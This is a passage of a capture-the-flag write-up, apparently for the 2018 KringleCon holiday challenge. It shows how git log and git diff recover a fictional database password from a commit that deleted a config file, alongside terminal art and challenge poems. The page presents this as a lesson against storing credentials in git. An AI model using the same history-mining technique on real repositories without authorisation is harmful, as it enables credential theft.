<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMM</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">ollldO</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(211, 215, 207);">M</span>MM<span style="color: rgb(52, 101, 164);">xlO</span>MM<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">Odllld</span><span style="color: rgb(211, 215, 207);">WMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMMW</span><span style="color: rgb(52, 101, 164);">0O</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">W</span>MM<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">kollldO</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">0k</span><span style="color: rgb(6, 152, 154);">K</span>M<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMMM</span>MMM<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(52, 101, 164);">klllooloollo0</span>MMMMMM<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMMMMMMM</span>M<span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">OO</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(52, 101, 164);">xl0</span><span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">OO</span><span style="color: rgb(6, 152, 154);">N</span>MM<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>M<span style="color: rgb(52, 101, 164);">kl0</span><span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>

Silly Minty Candycane, well this is what she gets.
"Winter2018" isn't for The Internets.
Passwords formed with season-year are on the hackers' list.
Maybe we should look at guidance published by the NIST?

Congratulations!

elf@776172646f67:~$</pre>
      </div>
      <div class="border rounded p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle mb-1" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="termGitpasshist"></a>Dev Ops Fail
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#hntSparkle">Sparkle RedberryHints</a>
            <a class="dropdown-item" href="#npcSparkle">Sparkle Redberry</a>
            <a class="dropdown-item" href="#obj7">Objective 7</a>
            <a class="dropdown-item" href="#termGitpasshist">Dev Ops Fail</a>
          </div>
        </div>

        <div id="divGitpasshist" style="display: inline-block" onclick='if (!$(this).html().includes("iframe")) {$(this).html(atob("PGlmcmFtZSBzdHlsZT0ibWluLXdpZHRoOiA4MDBweDsgbWF4LXdpZHRoOiAxMDAwcHg7IGhlaWdodDogODAwcHg7IGJvcmRlcjogbm9uZTsiIHNyYz0iaHR0cHM6Ly9kb2NrZXIua3JpbmdsZWNvbi5jb20vP2NoYWxsZW5nZT1naXRwYXNzaGlzdCI+PC9pZnJhbWU+PHA+PGEgaHJlZj0iIyEiIGNsYXNzPSJidG4gYnRuLWluZm8iICBvbm1vdXNldXA9IiQoJyNkaXZHaXRwYXNzaGlzdCcpLmh0bWwoYXRvYignUEdFZ2FISmxaajBpSXlFaUlHTnNZWE56UFNKaWRHNGdZblJ1TFdsdVptOGlQa05zYVdOcklHaGxjbVVnZEc4Z1BHSStiM0JsYmp3dllqNGdSR1YySUU5d2N5QkdZV2xzSUZSbGNtMXBibUZzUEM5aFBnPT0nKSkiPkNsaWNrIGhlcmUgdG8gPGI+Y2xvc2U8L2I+IERldiBPcHMgRmFpbCBUZXJtaW5hbDwvYT48L3A+"))}'>
          <a href="#!" class="btn btn-info">Click here to <b>open</b> Dev Ops Fail Terminal</a>
        </div>

        <hr class="my-4">
        <p></p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
<span style="color: rgb(211, 215, 207);">                                   </span>.<span style="color: rgb(196, 160, 0);">0</span>.<span style="color: rgb(211, 215, 207);">                                    </span>
<span style="color: rgb(211, 215, 207);">                               </span>.<span style="color: rgb(196, 160, 0);">:llOXKllc</span>. <span style="color: rgb(211, 215, 207);">                               </span>
<span style="color: rgb(211, 215, 207);">                                </span> .<span style="color: rgb(196, 160, 0);">OXXXK</span>, <span style="color: rgb(211, 215, 207);">                                 </span>
<span style="color: rgb(211, 215, 207);">                                 </span>'<span style="color: rgb(196, 160, 0);">0l</span>'<span style="color: rgb(196, 160, 0);">cOc</span><span style="color: rgb(211, 215, 207);">                                  </span>
<span style="color: rgb(211, 215, 207);">                                 </span>..<span style="color: rgb(78, 154, 6);">';'</span>.. <span style="color: rgb(211, 215, 207);">                                 </span>
<span style="color: rgb(211, 215, 207);">                              </span> .<span style="color: rgb(78, 154, 6);">';::::::'</span>. <span style="color: rgb(211, 215, 207);">                               </span>
<span style="color: rgb(211, 215, 207);">                           </span> .<span style="color: rgb(78, 154, 6);">':::::::::::::,</span>. <span style="color: rgb(211, 215, 207);">                            </span>
<span style="color: rgb(211, 215, 207);">                        </span> .<span style="color: rgb(78, 154, 6);">'::loc::::::::::::::,</span>.  <span style="color: rgb(211, 215, 207);">                        </span>
<span style="color: rgb(211, 215, 207);">                     </span> .<span style="color: rgb(78, 154, 6);">'::::o</span>MMN<span style="color: rgb(78, 154, 6);">c::::::::::::::::,</span>. <span style="color: rgb(211, 215, 207);">                      </span>
<span style="color: rgb(211, 215, 207);">                   </span> <span style="color: rgb(204, 0, 0);">.,;</span>;<span style="color: rgb(78, 154, 6);">,,,,:dxl:::::::</span><span style="color: rgb(204, 0, 0);">,,,</span>:<span style="color: rgb(78, 154, 6);">::;,,,,,,</span>.  <span style="color: rgb(211, 215, 207);">                   </span>
<span style="color: rgb(211, 215, 207);">                    </span><span style="color: rgb(204, 0, 0);">.,' </span> .<span style="color: rgb(78, 154, 6);">.;:::::::::::</span><span style="color: rgb(204, 0, 0);">;,;</span>:<span style="color: rgb(78, 154, 6);">:::,</span>. <span style="color: rgb(211, 215, 207);">                         </span>
<span style="color: rgb(211, 215, 207);">                     </span> .<span style="color: rgb(78, 154, 6);">';::::::::::::::::::::d</span>O<span style="color: rgb(78, 154, 6);">xc,</span>. <span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">                    </span>
<span style="color: rgb(211, 215, 207);">                  </span> .<span style="color: rgb(78, 154, 6);">';:::::::::okd::::::::::c</span>XMW<span style="color: rgb(78, 154, 6);">d:::,</span>. <span style="color: rgb(211, 215, 207);">                   </span>
<span style="color: rgb(211, 215, 207);">               </span> .<span style="color: rgb(78, 154, 6);">';:::::::::::c</span>NMM<span style="color: rgb(78, 154, 6);">o:::::::::::lc:::::::,</span>.  <span style="color: rgb(211, 215, 207);">               </span>
<span style="color: rgb(211, 215, 207);">            </span> .<span style="color: rgb(78, 154, 6);">'::::::::::::::::col:::::::::::</span>:<span style="color: rgb(204, 0, 0);">;</span>:<span style="color: rgb(78, 154, 6);">::::::::::,</span>. <span style="color: rgb(211, 215, 207);">             </span>
<span style="color: rgb(211, 215, 207);">            </span>       .<span style="color: rgb(78, 154, 6);">;::</span>:<span style="color: rgb(204, 0, 0);">,,,</span>:<span style="color: rgb(78, 154, 6);">::::::::::::::::</span><span style="color: rgb(204, 0, 0);">;,,,</span><span style="color: rgb(78, 154, 6);">:::::'</span>.       <span style="color: rgb(211, 215, 207);">            </span>
<span style="color: rgb(211, 215, 207);">               </span> .<span style="color: rgb(78, 154, 6);">'::::::</span><span style="color: rgb(204, 0, 0);">;;;</span><span style="color: rgb(78, 154, 6);">:::::::::::dko::::</span>:<span style="color: rgb(204, 0, 0);">;</span>:<span style="color: rgb(78, 154, 6);">:::::::;</span>.  <span style="color: rgb(211, 215, 207);">               </span>
<span style="color: rgb(211, 215, 207);">            </span> .<span style="color: rgb(78, 154, 6);">,::::::::::::::::::::::l</span>WMW<span style="color: rgb(78, 154, 6);">c::::::::::::::::;.</span>  <span style="color: rgb(211, 215, 207);">            </span>
<span style="color: rgb(211, 215, 207);">           </span> ..:00:...<span style="color: rgb(78, 154, 6);">;::::loc:::::::::coc::::::::::::'</span><span style="color: rgb(204, 0, 0);">.;;.</span>.... <span style="color: rgb(211, 215, 207);">           </span>
<span style="color: rgb(211, 215, 207);">              :N</span>Nl.<span style="color: rgb(78, 154, 6);">,:::::x</span>MMX<span style="color: rgb(78, 154, 6);">:::::</span>:<span style="color: rgb(78, 154, 6);">:::::::::::::::::::</span><span style="color: rgb(204, 0, 0);">;,,.</span><span style="color: rgb(211, 215, 207);">                </span>
<span style="color: rgb(211, 215, 207);">              </span> .<span style="color: rgb(78, 154, 6);">,::::::::cxxl:::</span>:<span style="color: rgb(204, 0, 0);">,,,</span>:<span style="color: rgb(78, 154, 6);">::::::::::::::::::::;</span>.  <span style="color: rgb(211, 215, 207);">             </span>
<span style="color: rgb(211, 215, 207);">          </span>  .<span style="color: rgb(78, 154, 6);">,:::::::c:::::::::::</span><span style="color: rgb(204, 0, 0);">;;;</span><span style="color: rgb(78, 154, 6);">:::::::</span><span style="color: rgb(204, 0, 0);">;;</span><span style="color: rgb(78, 154, 6);">:::::</span>kNX<span style="color: rgb(78, 154, 6);">d::::::;</span>.  <span style="color: rgb(211, 215, 207);">          </span>
<span style="color: rgb(211, 215, 207);">        </span> .<span style="color: rgb(78, 154, 6);">,::::::::c</span>KMN<span style="color: rgb(78, 154, 6);">o::::::::::::::::::</span><span style="color: rgb(204, 0, 0);">;,,;</span><span style="color: rgb(78, 154, 6);">::::x</span>KK<span style="color: rgb(78, 154, 6);">o:::::::::;</span>.  <span style="color: rgb(211, 215, 207);">       </span>
<span style="color: rgb(211, 215, 207);">      </span> .<span style="color: rgb(78, 154, 6);">'''''',:::::x</span>0O<span style="color: rgb(78, 154, 6);">c:::::::::o</span>OO<span style="color: rgb(78, 154, 6);">o::::::</span><span style="color: rgb(204, 0, 0);">::</span><span style="color: rgb(78, 154, 6);">:::::::::::::;'''''''</span>.  <span style="color: rgb(211, 215, 207);">     </span>
<span style="color: rgb(211, 215, 207);">           </span> .<span style="color: rgb(78, 154, 6);">,:::::::::::::::::::k</span>WW<span style="color: rgb(78, 154, 6);">k::::::::::::::ldl:::::;'</span>. <span style="color: rgb(211, 215, 207);">           </span>
<span style="color: rgb(211, 215, 207);">        </span> .<span style="color: rgb(78, 154, 6);">,::</span><span style="color: rgb(204, 0, 0);">;,,</span>:<span style="color: rgb(78, 154, 6);">:::::::::::::::::::::::::::::::::l</span>MMM<span style="color: rgb(78, 154, 6);">l:::::::;'</span>. <span style="color: rgb(211, 215, 207);">        </span>
<span style="color: rgb(211, 215, 207);">  </span> <span style="color: rgb(211, 215, 207);">  </span> .<span style="color: rgb(78, 154, 6);">,:::::</span><span style="color: rgb(204, 0, 0);">;,;</span>:<span style="color: rgb(78, 154, 6);">::::::::::::::::::::::::::::::::::ldl::::::::::::'</span>. <span style="color: rgb(211, 215, 207);">     </span>
<span style="color: rgb(211, 215, 207);">  </span> .<span style="color: rgb(78, 154, 6);">,::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::'</span>. <span style="color: rgb(211, 215, 207);">  </span>
<span style="color: rgb(211, 215, 207);"> </span>                              ..;;;;;;;;'.                              <span style="color: rgb(211, 215, 207);"> </span>
<span style="color: rgb(211, 215, 207);">                            </span> .'<span style="color: rgb(204, 0, 0);">;;;;;;;;;;;;</span>'. <span style="color: rgb(211, 215, 207);">                            </span>
<span style="color: rgb(211, 215, 207);">                         </span> .'<span style="color: rgb(204, 0, 0);">;;;;;;;;;;;;;;;;;;</span>'. <span style="color: rgb(211, 215, 207);">                         </span>
<span style="color: rgb(211, 215, 207);">                        </span> ........................  <span style="color: rgb(211, 215, 207);">                       </span>
<span style="color: rgb(211, 215, 207);">                                                                          </span>


Coalbox again, and I've got one more ask.
Sparkle Q. Redberry has fumbled a task.
Git pull and merging, she did all the day;
With all this gitting, some creds got away.

Urging - I scolded, "Don't put creds in git!"
She said, "Don't worry - you're having a fit.
If I did drop them then surely I could,
Upload some new code done up as one should."

Though I would like to believe this here elf,
I'm worried we've put some creds on a shelf.
Any who's curious might find our "oops,"
Please find it fast before some other snoops!

Find Sparkle's password, then run the runtoanswer tool.
<span style="color: rgb(0, 186, 19); font-weight: bold;">elf@776172646f67</span>:<span style="color: rgb(114, 159, 207); font-weight: bold;">~</span>$ ~</pre>
        <p>If we root around a little we see a directory. Inside that directoy we see evidence of git. Let's take a look at the log to see what kind of changes they've made.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
<span style="color: rgb(0, 186, 19); font-weight: bold;">elf@776172646f67</span>:<span style="color: rgb(114, 159, 207); font-weight: bold;">~</span>$ ls -al
total 5832
drwxr-xr-x 1 elf  elf     4096 Dec 14 16:30 <span style="color: rgb(114, 159, 207); font-weight: bold;">.</span>
drwxr-xr-x 1 root root    4096 Dec 14 16:30 <span style="color: rgb(114, 159, 207); font-weight: bold;">..</span>
-rw-r--r-- 1 elf  elf      220 May 15  2017 .bash_logout
-rw-r--r-- 1 elf  elf     1836 Dec 14 16:13 .bashrc
-rw-r--r-- 1 elf  elf      675 May 15  2017 .profile
drwxr-xr-x 1 elf  elf     4096 Nov 14 09:48 <span style="color: rgb(114, 159, 207); font-weight: bold;">kcconfmgmt</span>
-rwxr-xr-x 1 elf  elf  5944352 Dec 14 16:13 <span style="color: rgb(0, 186, 19); font-weight: bold;">runtoanswer</span>
<span style="color: rgb(0, 186, 19); font-weight: bold;">elf@776172646f67</span>:<span style="color: rgb(114, 159, 207); font-weight: bold;">~</span>$ cd kcconfmgmt/
<span style="color: rgb(0, 186, 19); font-weight: bold;">elf@776172646f67</span>:<span style="color: rgb(114, 159, 207); font-weight: bold;">~/kcconfmgmt</span>$ ls -al
total 72
drwxr-xr-x 1 elf elf  4096 Nov 14 09:48 <span style="color: rgb(114, 159, 207); font-weight: bold;">.</span>
drwxr-xr-x 1 elf elf  4096 Dec 14 16:30 <span style="color: rgb(114, 159, 207); font-weight: bold;">..</span>
drwxr-xr-x 1 elf elf  4096 Nov 14 09:48 <span style="color: rgb(114, 159, 207); font-weight: bold;">.git</span>
-rw-r--r-- 1 elf elf    66 Nov  1 15:30 README.md
-rw-r--r-- 1 elf elf  1074 Nov  3 20:28 app.js
-rw-r--r-- 1 elf elf 31003 Nov 14 09:46 package-lock.json
-rw-r--r-- 1 elf elf   537 Nov 14 09:48 package.json
drwxr-xr-x 1 elf elf  4096 Nov  2 15:05 <span style="color: rgb(114, 159, 207); font-weight: bold;">public</span>
drwxr-xr-x 1 elf elf  4096 Nov  2 15:05 <span style="color: rgb(114, 159, 207); font-weight: bold;">routes</span>
drwxr-xr-x 1 elf elf  4096 Nov 14 09:47 <span style="color: rgb(114, 159, 207); font-weight: bold;">server</span>
drwxr-xr-x 1 elf elf  4096 Nov  2 15:05 <span style="color: rgb(114, 159, 207); font-weight: bold;">views</span>
<span style="color: rgb(0, 186, 19); font-weight: bold;">elf@776172646f67</span>:<span style="color: rgb(114, 159, 207); font-weight: bold;">~/kcconfmgmt</span>$ git log

... [some lines removed] ...

<span style="color: rgb(196, 160, 0);">commit a6449287cf9ed9151d94fb747f6904158c2c4d71</span>
Author: Sparkle Redberry &lt;sredberry@kringlecon.com&gt;
Date:   Fri Nov 9 14:08:04 2018 -0500

    Add passport middleware for user auth

<span style="color: rgb(196, 160, 0);">commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b</span>
Author: Sparkle Redberry &lt;sredberry@kringlecon.com&gt;
Date:   Thu Nov 8 21:11:03 2018 -0500

    Per @tcoalbox admonishment, removed username/password from config.js, default settings in config.js.def need to be updated before use

<span style="color: rgb(196, 160, 0);">commit b2376f4a93ca1889ba7d947c2d14be9a5d138802</span>
Author: Sparkle Redberry &lt;sredberry@kringlecon.com&gt;
Date:   Thu Nov 8 13:25:32 2018 -0500

    Add passport module</pre>
        <p>Wait.... Does that say <b>removed username/password</b>? Let's take a look at the changes from the previous commit to that commit.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
-rw-r--r-- 1 elf elf    66 Nov  1 15:30 README.md
-rw-r--r-- 1 elf elf  1074 Nov  3 20:28 app.js
-rw-r--r-- 1 elf elf 31003 Nov 14 09:46 package-lock.json
-rw-r--r-- 1 elf elf   537 Nov 14 09:48 package.json
drwxr-xr-x 1 elf elf  4096 Nov  2 15:05 <span style="color: rgb(114, 159, 207); font-weight: bold;">public</span>
drwxr-xr-x 1 elf elf  4096 Nov  2 15:05 <span style="color: rgb(114, 159, 207); font-weight: bold;">routes</span>
drwxr-xr-x 1 elf elf  4096 Nov 14 09:47 <span style="color: rgb(114, 159, 207); font-weight: bold;">server</span>
drwxr-xr-x 1 elf elf  4096 Nov  2 15:05 <span style="color: rgb(114, 159, 207); font-weight: bold;">views</span>
<x-row line-overflow="true"><span style="color: rgb(0, 186, 19); font-weight: bold;">elf@776172646f67</span>:<span style="color: rgb(114, 159, 207); font-weight: bold;">~/kcconfmgmt</span>$ git diff b2376f4a93ca1889ba7d947c2d14be9a5d138802..60a2ffea7520ee980a5fc60177ff4d0633f2516b
<span style="font-weight: bold;">diff --git a/server/config/config.js b/server/config/config.js</span>
<span style="font-weight: bold;">deleted file mode 100644</span>
<span style="font-weight: bold;">index 25be269..0000000</span>
<span style="font-weight: bold;">--- a/server/config/config.js</span>
<span style="font-weight: bold;">+++ /dev/null</span>
<span style="color: rgb(6, 152, 154);">@@ -1,4 +0,0 @@</span>
<span style="color: rgb(204, 0, 0);">-// Database URL</span>
<span style="color: rgb(204, 0, 0);">-module.exports = {</span>
<span style="color: rgb(204, 0, 0);">-    'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'</span>
<span style="color: rgb(204, 0, 0);">-};</span>
<span style="font-weight: bold;">diff --git a/server/config/config.js.def b/server/config/config.js.def</span>
<span style="font-weight: bold;">new file mode 100644</span>
<span style="font-weight: bold;">index 0000000..740eba5</span>
<span style="font-weight: bold;">--- /dev/null</span>
<span style="font-weight: bold;">+++ b/server/config/config.js.def</span>
<span style="color: rgb(6, 152, 154);">@@ -0,0 +1,4 @@</span>
<span style="color: rgb(78, 154, 6);">+// Database URL</span>
<span style="color: rgb(78, 154, 6);">+module.exports = {</span>
<span style="color: rgb(78, 154, 6);">+    'url' : 'mongodb://username:password@127.0.0.1:27017/node-api'</span>
<span style="color: rgb(78, 154, 6);">+};</span>
<span style="color: rgb(0, 186, 19); font-weight: bold;">elf@776172646f67</span>:<span style="color: rgb(114, 159, 207); font-weight: bold;">~/kcconfmgmt</span>$</pre>
        <p>Well, look at that. <kbd>sredberry:twinkletwinkletwinkle</kbd>. Tsk, tsk.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
<span style="color: rgb(0, 186, 19); font-weight: bold;">elf@776172646f67</span>:<span style="color: rgb(114, 159, 207); font-weight: bold;">~/kcconfmgmt</span>$ runtoanswer
Loading, please wait......



Enter Sparkle Redberry's password: twinkletwinkletwinkle


This ain't "I told you so" time, but it's true:
I shake my head at the goofs we go through.
Everyone knows that the gits aren't the place;
Store your credentials in some safer space.

Congratulations!

<span style="color: rgb(0, 186, 19); font-weight: bold;">elf@776172646f67</span>:<span style="color: rgb(114, 159, 207); font-weight: bold;">~/kcconfmgmt</span>$</pre>


      </div>
      <div class="border rounded p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle mb-1" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="termPythonDockerChallenge"></a>Python Escape from LA
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#hntSugar">SugarPlum Mary Hints</a>
            <a class="dropdown-item" href="#npcSugar">SugarPlum Mary</a>
            <a class="dropdown-item" href="#obj8">Objective 8</a>
            <a class="dropdown-item" href="#termPythonDockerChallenge">Python Escape from LA</a>
          </div>
        </div>

        <div id="divPythonDockerChallenge" style="display: inline-block" onclick='if (!$(this).html().includes("iframe")) {$(this).html(atob("PGlmcmFtZSBzdHlsZT0ibWluLXdpZHRoOiA4MDBweDsgbWF4LXdpZHRoOiAxMDAwcHg7IGhlaWdodDogODAwcHg7IGJvcmRlcjogbm9uZTsiIHNyYz0iaHR0cHM6Ly9kb2NrZXIua3JpbmdsZWNvbi5jb20vP2NoYWxsZW5nZT1weXRob25fZG9ja2VyX2NoYWxsZW5nZSI+PC9pZnJhbWU+PHA+PGEgaHJlZj0iIyEiIGNsYXNzPSJidG4gYnRuLWluZm8iICBvbm1vdXNldXA9IiQoJyNkaXZQeXRob25Eb2NrZXJDaGFsbGVuZ2UnKS5odG1sKGF0b2IoJ1BHRWdhSEpsWmowaUl5RWlJR05zWVhOelBTSmlkRzRnWW5SdUxXbHVabThpUGtOc2FXTnJJR2hsY21VZ2RHOGdQR0krYjNCbGJqd3ZZajRnVUhsMGFHOXVJRVZ6WTJGd1pTQm1jbTl0SUV4QklGUmxjbTFwYm1Gc1BDOWhQZz09JykpIj5DbGljayBoZXJlIHRvIDxiPmNsb3NlPC9iPiBQeXRob24gRXNjYXBlIGZyb20gTEEgVGVybWluYWw8L2E+PC9wPg=="))}'>
          <a href="#!" class="btn btn-info">Click here to <b>open</b> Python Escape from LA Terminal</a>
        </div>

        <hr class="my-4">
        <p>As we open this challenge we are presented with I can only describe as the elf equivalent of the Kool-Aid man. Maybe it's the Egg-Nog Man? Oh wait, evermind, it's a Python eating an elf. I think I prefer the Egg-Nog man imagry. (☉_☉)</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
<span style="color: rgb(211, 215, 207);">               </span><span style="color: rgb(78, 154, 6);">:lllllllllllllllllllllllllllllllllllllllll</span>,<span style="color: rgb(211, 215, 207);">                      </span>
<span style="color: rgb(211, 215, 207);">               </span>'<span style="color: rgb(78, 154, 6);">lllllllllllllllllllllllllllllllllllllllll:</span> <span style="color: rgb(211, 215, 207);">                     </span>
<span style="color: rgb(211, 215, 207);">               </span> <span style="color: rgb(78, 154, 6);">clllllllllllllllllllllllllllllllllllllllll</span>.<span style="color: rgb(211, 215, 207);">                     </span>
<span style="color: rgb(211, 215, 207);">                </span>'<span style="color: rgb(78, 154, 6);">lllllllllllllllllllllllllllllllllllllllll:</span> <span style="color: rgb(211, 215, 207);">                    </span>
<span style="color: rgb(211, 215, 207);">                </span> <span style="color: rgb(78, 154, 6);">;lllllllllllllllllllllllllllllllllllllllll</span>, <span style="color: rgb(211, 215, 207);">                   </span>
<span style="color: rgb(211, 215, 207);">                 </span> <span style="color: rgb(78, 154, 6);">:lllllllllllllllllllllllllllllllllllllllll</span>.<span style="color: rgb(211, 215, 207);">                   </span>
<span style="color: rgb(211, 215, 207);">                 </span>  <span style="color: rgb(78, 154, 6);">:lllllllllllllllllllllllllllllllllllllllll</span>.<span style="color: rgb(211, 215, 207);">                  </span>
<span style="color: rgb(211, 215, 207);">                  </span>  <span style="color: rgb(78, 154, 6);">;lllllllllllllllllllllllllllllllllllllllll</span>' <span style="color: rgb(211, 215, 207);">                </span>
<span style="color: rgb(211, 215, 207);">                   </span>  '<span style="color: rgb(78, 154, 6);">lllllllllllllllllllllllllllllllllllllllll;</span> <span style="color: rgb(211, 215, 207);">               </span>
<span style="color: rgb(211, 215, 207);">                     </span> .<span style="color: rgb(78, 154, 6);">cllllllllllllllllllllllllllllllllllllllllc</span>. <span style="color: rgb(211, 215, 207);">             </span>
<span style="color: rgb(211, 215, 207);">                    </span>  .<span style="color: rgb(78, 154, 6);">:llllllllllllllllllllllllllllllllllllllllllc</span>,.<span style="color: rgb(211, 215, 207);">           </span>
<span style="color: rgb(211, 215, 207);">                  </span> .<span style="color: rgb(78, 154, 6);">:llllllllllllllllllllllllllllllllllllllllllllllll;</span>. <span style="color: rgb(211, 215, 207);">        </span>
<span style="color: rgb(211, 215, 207);">                </span>.<span style="color: rgb(78, 154, 6);">,cllllllllllllllllllllllllllllllllllllllllllllllllllll</span>, <span style="color: rgb(211, 215, 207);">       </span>
<span style="color: rgb(211, 215, 207);">             </span> .<span style="color: rgb(78, 154, 6);">;llllllllllllllllllllllllllllllllllllllllllllllllllllllllc</span>. <span style="color: rgb(211, 215, 207);">     </span>
<span style="color: rgb(211, 215, 207);">           </span>  <span style="color: rgb(78, 154, 6);">;lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc</span>.<span style="color: rgb(211, 215, 207);">     </span>
<span style="color: rgb(211, 215, 207);">          </span> '<span style="color: rgb(78, 154, 6);">llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc</span>  <span style="color: rgb(211, 215, 207);">   </span>
<span style="color: rgb(211, 215, 207);">         </span> <span style="color: rgb(78, 154, 6);">:lllllll:</span>..,..'<span style="color: rgb(78, 154, 6);">cllllllllllllllllllllllc</span>'.,'.'<span style="color: rgb(78, 154, 6);">clllllllllllllllllll;</span> <span style="color: rgb(211, 215, 207);">   </span>
<span style="color: rgb(211, 215, 207);">        </span>.<span style="color: rgb(78, 154, 6);">clllllll</span>' <span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(196, 160, 0);">:XK</span>.<span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(78, 154, 6);">:llllllllllllllllllll;</span> <span style="color: rgb(211, 215, 207);"> </span>,<span style="color: rgb(196, 160, 0);">XX</span>.<span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(78, 154, 6);">;lllllllllllllllllll</span>.<span style="color: rgb(211, 215, 207);">   </span>
<span style="color: rgb(211, 215, 207);">       </span>.<span style="color: rgb(78, 154, 6);">cllllllll</span>.<span style="color: rgb(211, 215, 207);">  </span><span style="color: rgb(196, 160, 0);">oXX</span>'<span style="color: rgb(211, 215, 207);">  </span>,<span style="color: rgb(78, 154, 6);">llllllllllllllllllll</span>. <span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(196, 160, 0);">cXX</span>;<span style="color: rgb(211, 215, 207);">  </span>.<span style="color: rgb(78, 154, 6);">lllllllllllllllllll</span>'<span style="color: rgb(211, 215, 207);">   </span>
<span style="color: rgb(211, 215, 207);">      </span> <span style="color: rgb(78, 154, 6);">clllllllll;</span> <span style="color: rgb(211, 215, 207);"> </span>.<span style="color: rgb(196, 160, 0);">xl</span>  .<span style="color: rgb(78, 154, 6);">cllllllllllllllllllllc</span>.<span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(196, 160, 0);">do</span> <span style="color: rgb(211, 215, 207);"> </span>.<span style="color: rgb(78, 154, 6);">clllllllllllllllllll</span>,<span style="color: rgb(211, 215, 207);">   </span>
<span style="color: rgb(211, 215, 207);">     </span> <span style="color: rgb(78, 154, 6);">:llllllllllll;</span>'..'<span style="color: rgb(78, 154, 6);">:llllllllllllllllllllllll:</span>'..'<span style="color: rgb(78, 154, 6);">:lllllllllllllllllllll</span>'<span style="color: rgb(211, 215, 207);">   </span>
<span style="color: rgb(211, 215, 207);">   </span> <span style="color: rgb(211, 215, 207);"> </span>.<span style="color: rgb(78, 154, 6);">llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll</span>.<span style="color: rgb(211, 215, 207);">   </span>
<span style="color: rgb(211, 215, 207);">     </span><span style="color: rgb(78, 154, 6);">;lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc</span> <span style="color: rgb(211, 215, 207);">   </span>
<span style="color: rgb(211, 215, 207);">    </span> <span style="color: rgb(78, 154, 6);">clllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll</span>. <span style="color: rgb(211, 215, 207);">   </span>
<span style="color: rgb(211, 215, 207);">    </span> <span style="color: rgb(78, 154, 6);">cllllllllllllllllllllllllll</span>..<span style="color: rgb(78, 154, 6);">;lc</span>..<span style="color: rgb(78, 154, 6);">:llllllllllllllllllllllllllllllllll;</span> <span style="color: rgb(211, 215, 207);">    </span>
<span style="color: rgb(211, 215, 207);">    </span> <span style="color: rgb(78, 154, 6);">:lllllllllllllllllllllllll:</span> <span style="color: rgb(211, 215, 207);"> </span>.<span style="color: rgb(78, 154, 6);">l</span>,<span style="color: rgb(211, 215, 207);">  </span>.<span style="color: rgb(78, 154, 6);">lllllllllllllllllllllllllllllllll:</span> <span style="color: rgb(211, 215, 207);">     </span>
